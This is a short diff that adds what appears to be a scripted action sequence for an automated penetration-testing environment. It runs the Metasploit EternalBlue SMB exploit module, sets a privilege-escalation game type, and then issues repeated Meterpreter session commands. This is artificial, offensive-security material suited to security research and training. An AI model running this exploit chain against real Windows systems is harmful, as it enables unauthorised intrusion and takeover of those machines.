@@ -1,0 +1,8 @@
+exploit/windows/smb/ms17_010_eternalblue; options; guess_options; run;
+
+set_game_type PRIVESC;
+
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
+execute_meterpreter_command_in_session; options; guess_options; run;
